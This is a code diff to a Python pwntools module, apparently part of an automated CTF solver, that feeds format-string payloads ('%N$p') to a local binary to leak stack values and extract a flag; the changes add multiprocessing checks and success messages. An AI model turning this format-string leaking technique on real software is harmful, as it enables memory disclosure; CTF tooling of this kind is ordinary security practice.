@@ -1,5 +1,6 @@
 from pwn import *
 from Print import Print
+from multiprocessing import current_process
 
 logging.getLogger('pwnlib').setLevel(logging.WARNING)
 
@@ -32,7 +33,7 @@ class FMT:
         for i in range(100):
             
             p = process(self.filename)
-            p.sendline(b"%" + str(i).encode("utf-8") + b"$p")
+            p.sendline(b"%" + str(i).encode() + b"$p")
             try:
                 for i in p.recvline().decode('utf-8').split(' '):
                     if '0x' in i:
@@ -43,15 +44,17 @@ class FMT:
             except EOFError:
                 break
             p.close()
-        
+       
         vals = ''.join(hex_vals)
-        print(vals)
         # TODO: Some flags on the stack don't have a right bracket
         if "flag" in vals:
             start = vals.find("flag")
             end = vals.find("}")
             flag = vals[start:end+1]
             flag_stripped = flag.strip("\n")
+            #print(flag_stripped)
+            if current_process().name == 'MainProcess':
+                self.fart_print.success(f"Flag found! {flag_stripped}")
             self.fart_print.flag(f"{self.analysis.bin_hash},{self.analysis.bin_name},{flag_stripped}")
             return True
         else:
@@ -123,5 +126,8 @@ class FMT:
             p.recvuntil(b"flag")
             flag = p.recvline().decode('utf-8').strip('\n')
             self.fart_print.flag(f"{self.analysis.bin_hash},{self.analysis.bin_name},flag{flag}")
+ 
+        if current_process().name == 'MainProcess':
+            self.fart_print.success(f"Flag found! {flag}")
 
         p.close()
